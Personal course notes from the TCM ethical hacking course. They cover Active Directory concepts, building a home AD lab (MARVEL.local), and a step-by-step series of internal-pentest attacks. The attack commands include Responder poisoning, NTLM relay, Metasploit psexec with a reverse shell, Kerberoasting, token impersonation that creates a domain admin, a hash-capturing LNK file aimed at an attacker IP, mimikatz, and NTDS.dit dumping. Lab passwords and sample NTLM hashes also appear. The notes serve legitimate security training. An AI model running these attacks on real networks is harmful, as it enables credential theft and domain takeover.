## Links
- [TCM](https://academy.tcm-sec.com/)
- [TCM Drive](https://www.notion.so/Ethical-Hacking-d4cc19377a5d413ab305ac4695638e8e)

-------
## ETH Notion
[[Ethical Hacking d4cc19377a5d413ab305ac4695638e8e.pdf|Notion]]

#### Enumerating SSH
- If you find ssh open => try to bruteforce the login
	2 reasons:
	1) Look for weak passwords
	2) Test if the bruteforce attack is detected or not
	
	All these 2 things are important inside a report

- If you find a file and port 80/443 open => try to connect ip/file
	  if you find this website:
	  =>  - you can upload a file using FTP
	       - execute it by accessing via browser


## Cheet
[[cheet|cheet]]

-------
# Capstones
[[Notes/TCM/Capstones/Blue/report|Blue Report]]
[[Notes/TCM/Capstones/Academy/report|Academy Report]]
[[Notes/TCM/Capstones/dev/report|Dev Report]]
[[Notes/TCM/Capstones/Butler/report|Butler Report]]
[[Notes/TCM/Capstones/Blackpearl/report|Back pearl Report]]

# Active Directory
**AD:**
- directory service developm by microsoft to manage --> <span style="color:#00b050">Win Domain Networks</span>
- <u>stores info</u> related to -->  <span style="color:#00b050">objects</span>   (as pc, users, printers...)
- authenticates using -->  <span style="color:#00b050">kerberos tickets</span>

> [!Warning] Why useful:
> - useful for <span style="color:#00b050">internal penetration testing</span>
> - even <span style="color:#00b050">no Windows machine</span> can use AD  --> using RADIUS or LDAP for 
>                                        authenticat
>                                        
>- AD is the <span style="color:#00b050">most used</span> -->  identity management 
>- <span style="color:#00b050">95%</span> of Fortune 1000 companies -->  impelement AD in their network
>- Can be exploited<span style="color:#00b050"> without attacking patchable exploits</span>
>- We abuse -->  **<span style="color:#6666ff">features</span>**, **<span style="color:#6666ff">trusts</span>** and **<span style="color:#6666ff">components</span>**

=>
everyone uses AD
=>
fundamental know what it is and how it works

## AD Component
AD is composed on:
1) Physical components
2) Logical components
![[Pasted image 20240217112645.png]]

### Physical AD Components
#### AD Domain Controllers 
- Most important component
- It controls everything
- <span style="color:#00b050">Host the AD</span>
- Provide -->  <span style="color:#00b050">authentication</span> and <span style="color:#00b050">authorization</span> services
- allow -->  <span style="color:#00b050">administrative access</span>
             =>
             to manage user accounts and network resources
#### AD DS Data Store
Contains the -->      - <span style="color:#00b050">DB files</span>
                 - <span style="color:#00b050">ntds.dit file</span>   (allows to pull sensistive info and hash passwords)
AD DS:
Is<span style="color:#00b050"> accessible only</span> through -->  Domain Controller (and protocols)

### Logical AD Components
#### AD Schema
- Defines every type of -->  <span style="color:#00b050">Objects</span>
                          that can be stored in the directory
                          
- <span style="color:#00b050">Enforces rules</span> regarding -->  object creation and configuration

<span style="color:#00b050">Object types:</span>
![[Pasted image 20240217112914.png]]

#### Domains
Used to:
- <span style="color:#00b050">group</span>
- <span style="color:#00b050">manage</span>     -->  <span style="color:#00b050">objects</span> in an organization

can be more than one domain

<span style="color:#00b050">domain example: </span>
![[Pasted image 20240217113326.png]]
#### Trees
A domain tree is -->  a hierarchy of domains in AS

all domains in the tree:
- share a namespace with parent domain
- can have addtional child domains

<span style="color:#00b050">domain tree example:</span>
![[Pasted image 20240217113343.png]]
#### Forests
forests -->  <span style="color:#00b050">collection</span> of 1 or more <span style="color:#00b050">domain trees</span>

forests:
- share a common schema
- share a common global catalog to -->  enable <span style="color:#00b050">searching</span>
- <span style="color:#00b050">enable trusts</span> -->  between all domains the forest
- share the -->  enterprise Admin and Schema Admins group

<span style="color:#00b050">forest example:</span>
![[Pasted image 20240217113825.png]]

> [!INFO] 
> we'll focus on -->  single domain 

#### Organizational Units (OUs)
OUs -->  AD containers
         =>
         can contain --> users, groups, computers ...

OUs are used to:
- represent your organization -->  <span style="color:#00b050">hierachically</span> and <span style="color:#00b050">logically</span>
- <span style="color:#00b050">manage a collection of objects</span> -->  in a consistent way
- <span style="color:#00b050">delegate permissions</span> -->  to administer groups of objects
- <span style="color:#00b050">apply policies</span>

#### Trusts
trust:
provide a mechanism for users -->  to<span style="color:#00b050"> gain access resources in another domain</span>

Type of trusts:
![[Pasted image 20240217114526.png]]

- All domains in a forest -->  trust all other domains in the forest
- Trusts can extend -->  outside the forest

#### Objects
type of objects:
![[Pasted image 20240217114741.png]]


-----
## AD LAB
### Build up
- Download from here:
	- [Windows 10 enterprise 64](https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise)
	- [Windows Server 22 64](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022)

#### Windows Server Setup
Open [[cheet#VM Ware|VM Ware]]
Create a New VM:
- Select Install OS later > Windows Server 2022 > split disk in multi files > 60gb
- Finish 
- Then:
	- set at least 8gb RAM
	- set the ISO to the Server iso that you downloaded
	- run the vm
	- Select Custom Installation
	- Create a partition![[Pasted image 20240217152003.png]]
	- Set a password -->  `P@$$w0rd!`

Now:
install the vm tools --> [[Notes_ETH#Install VM Tools (guest addition)]]

##### Rename PC
then:
- click windows button > search name > click on View your pc Name > Rename this pc
- call it <span style="color:#00b050">HYDRA-DC</span>
- reboot

Now we need to make this machine our -->  <span style="color:#00b050">AD Domain Controller </span>
=>
##### Create our AD Domain Controller
On the Server Manager Dashboard: (the default page that is open)
- Click on Manage > Add Role and Features
- Next > Role based or feature > Next > Select Active Directory Domain Services >
     Add Features >
- Next > Next > Click restart the destination automatically if required > yes > Install
=>
We are installing our Domain Controller

<span style="color:#00b050">When it finishes the installation:</span>
- click on Promote this server to a domain controller
- Add a new Forest, called MARVEL.local   (I'm just following the tutorial)
- click Next > retype the same password as the admin `P@$$w0rd!`
- click Next until you can click on Install
- when it finishes click Close and wait for reboot

After the reboot:
<span style="color:#00b050">we'll enter inside our domain "marvel"!</span>
![[Pasted image 20240217154740.png]]

##### Create a Certificate Service
Last thing after the reboot:
we need to do again the same steps for adding -->  the Certificate Service
We need this to -->  <span style="color:#00b050">verify the identity of the Domain Controller</span>
=>
- Click on Manage > Add Role and Features
- Next > Role based or feature > Next > Select Active Directory Certificate Services > Add Features >
- Next > Next > Next >Click restart the destination automatically if required > yes > Install

<span style="color:#00b050">When it finishes the installation:</span>
- click on Configure Active Directory Certificate Services on the dest server
- Next > Select Certificate Authority > Next Until Validity > Select 99  years
- Click Next until you can click Configure
- When it finishes -->  Close > Close > Reboot
- Login and then Shutdown the VM

#### Windows Machines
- Create a new VM > Select the windows ISO > Select Windows 10 enterprise
- Click Next > Select as Virtual Machine Name "<span style="color:#00b050">THEPUNISHER</span>" > Next > 60 gb
- Finish

Customize the VM:
- Remove the floopy disk
- Select memory to 5 gb
- Run

Now:
recreate a second machine indentical to this one
Select as Virtual Machine Name "<span style="color:#00b050">SPIDERMAN</span>"

In both we need to do the same steps:
- Run them
- Select Custom Installation
- Create a partition as in the Domain Controller Machine
- when you arrive here:![[Pasted image 20240217162901.png]]
- Click on domain join instead 
- call SPIDERMAN -->  <span style="color:#00b050">peterpark</span>
- call THEPUNISHER -->  <span style="color:#00b050">frankcastle</span>
- set password -->  `Password1`
- set all the answers to `bob`
- deselect all
- skip cortana
- <span style="color:#00b050">the machine will enter inside windows</span>
- install the [[Notes_ETH#Install VM Tools (guest addition)|VMWare Tools]] and restart
- change the [[Notes_ETH#Rename PC|pc name]] and reboot
- Shutdown both

:)

##### Install VM Tools (guest addition)
Inside the VM go to the upper bar:
- Virtual Machine > Install VMWare Tools
- It should open the autorun inside the VM for installing the tools
- if not open the file explorel inside the VM and search for VMWare Tools and run the setup64



#### Setting Up Users, Groups, and Policies
Now we are going to set -->  Users, Groups and Policies
Why:
- to exploit them after in the course 
- see some of the wrong things that the people set with AD
=>
##### Add Users
Run the Domain Controller
From the Server Manager:
- click on Tools > Active Directory Users and Computers
- click on MARVEL.local > right click on it > New > Organizational Unit
- Name it `Groups`
- Move these selected groups to the folder that we have created (type yes)![[Pasted image 20240217172153.png]]
- Move even these to the same folder ![[Pasted image 20240217172306.png]]

<span style="color:#00b050">Now we are going to create new root and normal users:</span>
- right click on Administrator > Copy
- create user Tony Stark with user logon name = tstark > Next > put `Password1` > 
     set Password never expires > Next > Finish
- do the same => create usr SQL(first name) Sevice(second name), logon name = SQLService >
      put `MYpassword123#` > set Password never expires > Next > Finish
- double click on SQL Service > set the description as `The password is MYpassword123#`
> [!warning] 
> this is something that some people do
> They think that is secure to put the password inside the description... but it is not

- right click on white space under the user > New > User
- create users for our machine THEPUNISHER and SPIDERMAN 
     =>
  - first user Frank Castle logon name = fcastle and put `Password1`  > set only password never expires > Next > Finish
  - same things with Peter Park logon name = ppark and put `Password2` > and =
 - quit

From the Server Manager:
- click on File and Storage Services > Shares > New Share > Next > Next >
- Share name = hackme > Next > Next > Create

##### Set up the Service Account
open cmd ad admin
`setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService`

##### Set up a Group Policy 
<span style="color:#00b050">Now we are going to disable Microsoft windows defender:</span> (to make  easier the course)
- click win button > search for Group Policy Management 
- Right click on MARVEL.local > Create a GPO ...![[Pasted image 20240217174005.png]]

- Named in Disable Windows Defender
- right click on Disable Windows Defender > Edit >
- ![[Pasted image 20240217174259.png]]
- Navigate to Windows Components > search for Microsoft Defender Antivirus
- On the right panel double click on -->  Turn off Microsoft Defender Antivirus
- select Enable > Apply > Ok
- Return to the Disable Windows Defender > right click > Enforced 
     =>  every time a user/pc join this domain, it will apply this policy

##### Set a static IP
- open a cmd and type `ipconfig` 
- copy the IP and the default gateway
- go here ![[Pasted image 20240218112436.png]]![[Pasted image 20240217174814.png]] 
- click on Properties > Internet Protocol Version 4 > set the ip and default gateway to values found inside cmd (`ip = 172.16.214.128`)


<span style="color:#00b050">shutdown the Domain Controller </span> 



#### Joining our machines to the Domain
Now we can:
- reduce the RAM of Domain Controller
- login inside all the 3 machines

For the 2 windows machines:
- go here![[Pasted image 20240218112424.png]]

- Right Click on Ethernet > Properties > Internet Protocol Version 4 
- Set the DNS server address as our Domain Controller IP  (`172.16.214.128`)

<span style="color:#00b050">Now we want to join our domain:</span>
- click win button > search domain > click on Access work or school > Connect
- click Join this device to a local Active Directory domain
- enter the domain name --> `MARVEL.local`
- insert the admin credentials -->  `administrator - P@$$w0rd!`
- User account and Account type both administrator type
- Restart
- do the same for the other windows machine

<span style="color:#00b050">Check if the windows machines are connected to our domain:</span>
- login inside Domain Controller
- from the Server Manager Dashboard:
	- click on Tools > Active Directory Users and Computers > MARVEL.local > Computers
	- Check that you can see the 2 win machines![[Pasted image 20240218115809.png]]

<span style="color:#00b050">let's go back to THEPUNISHER</span>
- login as MARVEL\administrator  (type `P@$$w0rd!`)
- we want to add some local administrator accounts:
	- click win button > search Edit local users and groups 
	- now we'll enable the local Administrator account:  (bad practice that people do)
		- right click Administrator > Set Password > `Password1!` > Ok
		- double click into Administrator > uncheck Account is disabled > Ok
		  
     - click on Groups > Administrator > Add > type fcastle > Check Names > Ok > Apply
	 - close all these tabs
- now we enable the Network:
	- click on the file explorer
	- Network > click Ok on the error that you'll see > double click on this![[Pasted image 20240218120958.png]]
	- click on Turn on network discovery and file sharing
	- <span style="color:#00b050">Now we can see our Domain Controller!</span>

<span style="color:#00b050">let's do all the same steps into SPIDERMAN:</span>
- but we'll add 2 users this time:
	- all the same steps
	- click on Groups > Administrator > Add > type pparker > Check Names > Ok > Apply
	- click on Groups > Administrator > Add > type fcastle > Check Names > Ok > Apply
	- continue with the same steps

  - now logout as this administrator account (win button > Administrator > Sign out)
  - <span style="color:#00b050">sign in as local administrator:</span>
	  - `.\peterparker`
	  - `Password1`
  - click on file explorer > This PC > Computer > Map network drive (4 in the img is a mistake)![[Pasted image 20240218121654.png]]
	- write as folder -->  `\\HYDRA-DC\hackme`
	- enable Connect using different  > Finish
	- enter the administrator credential -->  `administrator - P@$$w0rd!`
	- <span style="color:#00b050">Now we have a share drive into our machine!</span>![[Pasted image 20240218121954.png]]

**WE HAVE FINISHED THE AD LAB SETUP :)**


### Intro AD Attacks
Scenario that we are going to simulate:
- we have a client
- we are performing a pentest
- as a company we send a laptop to the client
	- inside the laptop there is a VPN connection
	- if the VPN connection is enabled:
		- => the pentest team can connect to the VPN
		- => we can run the attacks remotely 
		- 
> [!info] 
> This is the typical scenario for a pentester
> =>
> you don't need anymore to go phisicaly to the client company

=>
	the idea is that -->  - the client laptop has been compromised
					 - we are going to run different attacks
 
#### LLMNR Poisoning
Most common attack in -->  internal penetatrion test

LLMNR = <span style="color:#00b050">Link Local Multicast Name Resolution</span> 
         - protocol used to **identify hosts when DNS fails to do so****
         - previously called NBT-NS

Workflow attack:
![[Pasted image 20240225102230.png]]
the service uses:
- username
- hash                -->   when someone appropriately responded to
  
=>
if we respond to the server in the right way =>    - the server will send us the username + hash
                                         - we can try to decrypt the hash

##### Responder
#AD_tool
we'll use the tool [[cheet#Responder|responder]] -->  to perform this attack
=>
`sudo python3 Responder.py -I vmnet8 -dPv`    (or dwv)

from THEPUNISHER:
- login as fcastle with Password1
- open file explorer
- type in the bar -->  `\\ip attacker`
=>
<span style="color:#00b050">we have capture hash</span>
![[Pasted image 20240225110349.png]]

##### Crack the password
#AD_tool
save the hash inside a file called hash.txt =>  `echo fcastle::MARVEL:... > hash.txt`
- we'll use [[cheet#hashcat]]
- we have captured an -->  NTLMv2 hash
  =>
  we need to find the hashcat module for NTLMv2
  =>
- `hashcat --help | grep NTLM`![[Pasted image 20240225111403.png]]
  =>
  the module is -->  5600

=>
`hashcat -m 5600 hash.txt rockyou.txt`
=>
![[Pasted image 20240225112104.png]]
<span style="color:#00b050">password found :)</span>

##### LLMNR Mitigation
Best defence:
- disable LLMNR and NBT-NS

If you need this protocol => best practice:
- require Network Access Control
- use really strong strong password

#### SMB Relay Attack
Instead of cracking hashes obtained with Responder:
we can -->      - relay those hashes with SMB
            - gain access to a machine

<span style="background:#fff88f">requirements for this attack:</span>
- SMB signing -->  must be disabled 
- relayed user credentials -->  must be admin on machine (for any real value)

attack steps:
1) Identify hosts without SMB Signing
2) use Responder (but with modification to Responder.conf => SMB and HTTP OFF)
3) use ntlmrelayx.py
4) from the victim side we need an event that occurs

##### Identify host without SMB Signing (nmap)
#AD_tool
`nmap --script=smb2-security-mode.nse -p445 <DomainControllerIP> -Pn`
`-Pn` -->  treat all hosts as online
=>
`nmap --script=smb2-security-mode.nse -p445 172.16.214.128 -Pn`
This is the message that we are looking for:
![[Pasted image 20240226103728.png]]

=>
create a .txt file and insert the Domain Controller IP -->  called targets.txt

##### Modify and use Responder
We need to disable -->  SMB and HTTP
`sudo vi ~/Desktop/TCM/tools/Responder`
change to Off -->  SMB and HTTP

now we can use it:
`sudo python3 Responder.py -I vmnet8 -dPv`

##### Set up NTLM relay (ntlmrelayx.py)
#AD_tool
`ntlmrelayx.py -tf targets.txt -sm2support` 
`-tf` -->  target file

##### Victim Event Occurs
from THEPUNISHER:
- login as fcastle with Password1
- open file explorer
- type in the bar -->  `\\ip attacker`
=>
if we look at our terminal with `ntlmrelayx.py':
<font color="#2DC26B">we have found Aministrator and Peter Parker hashes</font>
![[Pasted image 20240226104434.png]]

##### Another possible Attack
`ntlmrelayx.py -tf targets.txt -sm2support -i`
`-i` -->  interactive mode
=>
if we create again another event inside the victim:
<span style="color:#00b050">we obtain a shell via TCP</span>
![[Pasted image 20240226105252.png]]
=>
we need to bind to that shell:
`nc 127.0.0.1 11000`
![[Pasted image 20240226105537.png]]
if we type `help` -->  we can see all the commands that we can use

##### SMB Relay Mitigation
<span style="background:#fff88f">Possibile mitigation:</span>
![[Pasted image 20240226110048.png]]

#### Gaining Shell Access
we can do in different ways

##### Metasploit
#AD_tool
`msfconsole`
`search psexec`    and look for exploit/windows/smb/psexec
`use <number>`
`options`
`set payload windows/x64/meterpreter/reverse_tcp`
`set RHOST <THE PUNISHER IP>`      172.16.214.130
`set smbdomain MARVEL.local`
`set smbuser fcastle`
`set smbpass Password1`
`run`

> [!warning] If it fails:
> type `show targets`
> and try with PowerShell or Native upload

**<span style="font-weight:bold; color:#00b050">if it fails anyway:</span>**
open the windows machine (THEPUNISHER or SPIDERMAN)
- type in the search bar -->  `virus and threat protection`
- in the virtus and threat protection settings -->  click on Manage settings
- turn all OFF

##### psexec.py
#AD_tool
`sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`
[[cheet#psexec.py]]
![[Pasted image 20240226112845.png]]

#### IPv6 Attacks
In some machines IPv6:
-  is enabled
- but is not used
=>
if IPv6 is on:
<span style="background:#fff88f">who is doing DNS resolution for it?</span>
                 <span style="color:#00b050">usually no one</span>
=>
we can set up a fake DNS -->  using [[cheet#mitm6]]

##### mitm6
#AD_tool
follow all the steps --> [[cheet#mitm6|here]]
if you reboot THEPUNISHER:
- you will obtain a lot of information
- if you go inside your lootme_folder you will find some of them 

##### IPv6 Mitigation
![[Pasted image 20240226122019.png]]


#### Passback Attacks
Multi-Function Peripherals (MFPs) -->  are devices that must be considered during an internal 
                                 pentesting
What can a printer brings:
- Credential Disclosure
- File System Access
- Memory Access

Here you can read about it --> [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

### Initial Internal attack strategy
#AD_Strategy
what are the things that you want to do in an internal pentest:
- using Responder or mitm6 
> [!info] Best time to run Responder:
> - in the morning before users login 
> - after lunch 
>   =>
>   the best time is -->  when there is a lot of traffic

- run scans (as nessus scan) -->  to generate traffic
- if scans take too long and we don't find any respond =>  start looking for websites in scope
												 (using `http_version`)
- look for default credential on web logins:
	- Printers
	- Jenkins
	- etc




### Post-Compromise Enumeration
What happen after we have compromised a domain:
we go back to do -->  <span style="color:#00b050">enumeration</span>

once we have a valid account in a domain:
we have the ability to get -->  a lot of information 

####  Domain Enumeration with ldapdomaindump
#AD_tool
[[cheet#ldapdomaindump|ldapdomaindump]] 
`mkdir marvel.local`
`sudo ldapdomaindump ldaps://172.16.214.128 -u 'MARVEL\fcastle' -p Password1 -o marvel.local'

we'll find all the information obtained inside the -->  marvel.local folder
first thing we want to know:
<span style="color:#00b050">which are our high value targets </span> => lets open the <span style="background:#fff88f">domain_users_by_group </span><span style="background:#fff88f">file</span> (inside marvel dir)
![[Pasted image 20240301143955.png]]

As you can remember:
- during active directory setup in the [[Notes_ETH#Add Users]]
- we created a user SQL and we write in the description -->  the password
- as you can see from the image -->  with this tool <span style="color:#00b050">we found that password </span>

we can also see:
- all the accounts -->  inside the same file
- all the hosts -->  inside the <span style="background:#fff88f">domain_users file </span>


#### Domain Enumeration with Bloodhound
follow these [[cheet#bloodhound|steps]]

#### Domain Enumeration with plumHound
follow these [[cheet#plumHound|steps]]



### Post-Compromise Attacks
We'll see what can we do after having compromised an account
Things we can do:
- compromise other accounts
- compromise the entire domain

#### Pass Attacks
if we dump a password:
we can leverage that to -->    - pass around the network    (passare alla rete)
                         - we can use it for lateral movement 

##### crackmapexec
#AD_tool
turn on all the windows machines
follow these [[cheet#crackmapexec|steps]]
`crackmapexec smb 172.16.214.0/24 -u fcastle -d MARVEL.local -p Password1`
=>
![[Pasted image 20240301163145.png]]
with our credentials:
we found that our account <span style="color:#00b050">has access</span> to -->  THEPUNISHER and SPIDERMAN machines

##### Dumping and Cracking Hashes
[[cheet#secretsdump]]
![[Pasted image 20240301165841.png]]
=>
<span style="color:#00b050">save all the hashes for the account that you haven't seen before</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

to crack one of these hashes:
![[Pasted image 20240301170401.png]]
you need only the last part underline
=>
- save the last part inside a txt file
- follow these [[Notes_ETH#Crack the password|steps]]
- use the module 1000
=>
`hashcat -m 1000 hashNTLM.txt rockyou.txt`
![[Pasted image 20240301171210.png]]

<span style="color:#00b050">And we have found the password for this account:</span>
![[Pasted image 20240301171243.png]]

##### Pass Attacks Mitigation
![[Pasted image 20240301171521.png]]

#### Kerberoasting
#AD_tool
Attack to get domain admin in a network

what the attack does:
- takes advantages of -->  service accounts
- we have setup one (SQLService)

What happen when we want to request access to a Service:
![[Pasted image 20240301171928.png]]

- lets imagine that we have an application called -->  Server
- we want to access this application

in order to do that:
- we need to request some stuff from -->  <span style="color:#00b050">Key Distribution Center (KDC)</span> 
- in a legitimate request:
	- we make a -->  TGT request (bc we are providing our username and pass to the Domain
																	    Controller)
	- we receive a TGT back  (Ticket Granting Ticket)
	=>
	any user inside the domain -->  can request this TGT
	=>
    <span style="color:#00b050">if we have compromised an account</span> -->  we can ask this TGT

once we do that:
- we need to request -->  a TGS ticket  (a Service ticket)
- to request it we need to present -->  a TGT
- the Domain Controller will send back this TGS
	- what it is interesting:
		- <span style="color:#00b050">TGS is encrypted with</span> the -->  Server account hash

in a normal scenario:
- we will present this TGS to -->  the service that we want to access (Application Server)
- the service: will:
	- decrypt the TGS
	- determine if we can access

What we will focus on:
- steps 4
- since we have compromised an account:
	- we can request a TGS
	- we'll receive it by the Domain Contoller
	- <span style="color:#00b050">we can try to crack that hash</span> 

=>
to do that:
- we'll use a tool called -->  GetUserSPNs
- the tool will:
	- request a TGS to the Domain Controller using the credentials that we specified 
	- return an hash

##### Attack
turn on the Domain Controller
`sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 172.16.214.120 -request`
`-dc-ip` --> Domain Controller IP
![[Pasted image 20240301174332.png]]
now:
- copy the entire hash inside a file krb.txt
- use hashcat
	- hashcat -m 13100 krb.txt rockyou.txt
	- ![[Pasted image 20240301174636.png]]
	- <span style="color:#00b050">Password found!</span>

##### Mitigation
The Service account should not be running -->  as domain admin

#### Token Impersonation
<span style="color:#00b050">Tokens</span> = <span style="color:#00b050">temporary keys</span> that allow you to acces to a system/network <span style="color:#00b050">without </span>having to <span style="color:#00b050">provide</span>
         <span style="color:#00b050">credentials</span> each time you access

2 types:
- <span style="color:#00b050">delegate</span> -->  created for logging into a machine 
- <span style="color:#00b050">impersonate</span> -->  non interactive 

why tokens are bad:
with metasploit we can do -->  <span style="color:#00b050">token impersonation</span> 
							we can:
							- list the available tokens
							- impersonate the user that has this token
##### Attack
We need to turn on THEPUNISHER and the Domain Controller
there are a lot of tools for impersonation -->       - metasploit
                                         - mimikatz 
<span style="background:#fff88f">here we'll use metasploit</span>
`msfconsole`
`search psexec`
`use exploit/windows/smb/psexec`
`options`
`set paylaod windows/x64/meterpreter/reverse_tcp`
`set rhosts 172.16.214.130`       THEPUNISHER_IP
`set smbuser fcastle`
`set smbpass Password1`
`set smbdomain MARVEL.local`
`run`

###### incognito
#AD_tool
`load incognito`
> [!info] Load an extension
> once you have a shell for example:
 >`load incognito`
> `options`              (to see all the extension commands) 
> 
> For example with incognito we can:
> - list all the tokens
> - impersonate a token
> - add a user

from THEPUNISHER machine:
logout and login as -->  `MARVEL\administrator`  (`P@$$w0rd!`)
=>
in this way we have created -->  a <span style="color:#00b050">delegate token</span>
=>

from msfconsole:
`list_tokens -u`        (-u -->  user)
![[Pasted image 20240303121256.png]]
`impersonate_token MARVEL\\administrator`

how do we know that we are impersonating this user:
type shell and whoami -->      `shell`
                         `whoami`
                         ![[Pasted image 20240303121406.png]]
let's add one user:
`net user /add hawkeye Password1@ /domain`
add the user to the admin group:
`net group "Domain Admins" hawkeye /ADD /DOMAIN`

how to prove it:
open a new terminal tab
use -->  [[cheet#secretsdump]]
`<span style="background:#fff88f">secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.130</span>`       (domain controller IP)

=>
<span style="color:#00b050">with this attack we have:</span>
- impersonate a domain admin
- run commands
- add user to the domain
- made it a domain admin
- compromise the domain without ever actually compromising an account outside THEPUNISHER machine

##### Mitigation
- Limit user/group token creation permission
- local admin restriction
- account tiering (categorizing customers into groups with similar characteristics and needs)


#### LNK File Attack
#AD_tool
with this attack we can:
set up a -->  watering hole (sorgente)

- let's assume we can access a file share  (es HYDRA-DC hackme)
- we want to dump a malicious file into it
=>
we can do that via Powershell:
```Powershell
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\172.16.214.1\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```
``
here we:
- are generating a file
- are putting the file inside the file share
- if we have [[cheet#Responder|responder]] up and the file is triggered => we can <span style="color:#00b050">capture an hash</span>
  =>
  can be useful for -->  elevate privileges

> [!warning] Esempio Callout
> <span style="background:#fff88f">The commands showed for Poweshell:</span>
> - must be done in a Windows machine
> - can be whatever windows machine =>  not necessarily the victim machine
> - PowerShell must be an--> elevate shell

what we are doing with these commands:
- we are creating a link file
- save it inside C drive as --> `C:\@test.lnk`
- the file will try to:
	- resolve an png image
	- bind to the `ATTACKER IP`

When we have typed all the commands:
- go to C and put the `@` -->  as first letter of the name of the file
- copy the @test.lnk file inside -->  `\\HYDRA-DC/hackme`

From the attacker machine:
- run [[cheet#Responder]]
- `sudo python3 Responder.py -I vmnet8 -dPv`
  ![[Pasted image 20240303130457.png]]

Now:
if we navigate inside the HYDRA-DC/hackme in the Windows machine
=>
<span style="color:#00b050">we'll capture the hash inside Responder</span>
![[Pasted image 20240303130539.png]]

##### Automate the attack
we can automate this attack using -->  [[cheet#crackmapexec]]
`crackmapexec smb 172.16.214.130 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=172.16.214.1

`172.16.214.130` -->  victim IP (THEPUNISHER)
`172.16.214.1` -->  attacker IP

#### GPP Attacks (cPassword Attacks)
#AD_tool
This is an old attack
=> (no lab but it's still important to know it)

what this attack is:
- Group Policy Preferences (GPP) allowed admins to -->  create policies using embedded 
                                                 credentials
- These credentials were encrypted and placed in a -->  "cPassword"
- The key was accidentally released to this cPassword
  =>
  these password <span style="color:#00b050">could be decrypted</span>

- attack was patched in -->  MS14-025
- but <span style="color:#00b050">I</span><span style="color:#00b050">T DOES NOT PREVENT</span> -->  previous uses
  =>
  still relevant
  bc if these older files were never deleted =>  - these passwords still exist
                                         - they still could work in the environment

#### Mimikatz
#AD_tool
login inside SPIDERMAN as normal user (pparker Password1)

read these [[cheet#Mimikatz|lines]]

first thing to do with this tool:
- set privilege mode for debugging 
  =>
  if you only type `privilege::` -->  you can see all the modules that you can use
- `privilege::debug`
- <span style="color:#00b050">now we can run different attacks</span> 

##### sekurlsa
we'll use the module -->  sekurlsa (most used)
`sekurlsa::`  -->  to see all the possibile options
![[Pasted image 20240303185229.png]]

###### logonPasswords
`sekurlsa::logonPasswords`
what we have found:
- peterparker NTLM hash (that we can decrypt using hashcat)
  ![[Pasted image 20240303190243.png]]
<span style="background:#fff88f">but most important, we have found:</span>                             it's the first time that we found it
- <span style="color:#00b050">MARVEL\administrator password in clear text</span>
  ![[Pasted image 20240303190503.png]]

why we can retrieve this password:
- bc it's stored inside the -->  cred manager
- we have the access to the hackme drive share
- and we set up that you can connect -->  using different credentials

#### Post-Compromise Attack strategy
#AD_Strategy 
in this phase we have an account
=>
what do we do:
- search for quick wins
  =>
	- [[Notes_ETH#Kerberoasting|Kerberoasting]]
	- [[cheet#secretsdump|secretsdump]]
	- [[Notes_ETH#Pass Attacks|pass the hash and pass the password]]
- no quick wins => dig deep:
	- enumerate ([[cheet#bloodhound|bloodhound]])
	- where does your account have access?
	- old vulnerabilities die hard

###  Post-Domain Compromise Attack 
#### Post-Domain Compromise Attack strategy
#AD_Strategy
here we own the domain
what do we do:
- <span style="color:#00b050">provide as much value to client as possible</span>
	- if in a 5 days work you compromise the domain in the 1st one =>  repeat the whole process 
	                                                         again to find new vuln
	- dump the NTDS.dit and crack passwords
	- enumerates share for sensitive information
- <span style="color:#00b050">persistence is important</span>
	- what happen if our Domain Admin access is lost?
	- create a Domain Admin account can be useful      (you must delete it after finishing the job)
	- creating a Golden Ticket can be useful too   (for persistent)

#### Dumping the NTDS.dit
#AD_tool
NTDS.dit -->  <span style="color:#00b050">DB used to store AD data</span>
			includes:
			- user information
			- group information
			- security descriptors
			- password hashes

to dump this DB we can use -->  [[cheet#secretsdump|secretsdump]] (with a known domain admin)
=>
`secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.128 -just-dc-ntlm`
`172.16.214.128 -->  Domain Controller IP
in this way we can get all the hashes:
![[Pasted image 20240304114746.png]]

Remember that we need only the last part of each hashes -->  to decrypt them
=>
trick to speed up this process:

##### Speed up hash decrypt with Excel
- copy all the hashes inside excel
  ![[Pasted image 20240304111838.png]]
- go to Data > Text to Column > click on Delimited > Next > Click also on Other and set to "`:`" >
- Next > Finish
- in this way <span style="color:#00b050">we have divided each part</span> -->  the last one is what we want
  ![[Pasted image 20240304112146.png]]
=>
- copy all the hash
- paste them inside a txt file
- use [[cheet#hashcat|hashcat]] to decrypt them
  `hashcat -m 1000 hashNTDS.txt /home/simone/Desktop/TCM/rockyou.txt`
  =>
  <span style="color:#00b050">we have found 6/12 passwords</span> 
  now type `--show` to print all of them:
  `hashcat -m 1000 hashNTDS.txt /home/simone/Desktop/TCM/rockyou.txt`
  ![[Pasted image 20240304113046.png]]
now:
- copy all these hashes in a -->  new tab in excel  (sheet2 below at the left)
- separate again as before the hashes from the passwords
- go back to the sheet1
- click on the first free cell in column C after the first hash
- type  `=vlookup(B1,Sheet2!A:B,2,false)`
  =>
  this is the result:![[Pasted image 20240304113517.png]]
  (4 in an error)

when we have all the passwords:
- click on the entire C column > Copy it > right click > Paste as Values (img with the `123` inside)
- now we can delete the `#N/A` -->  bc we have deleted the formula for the column
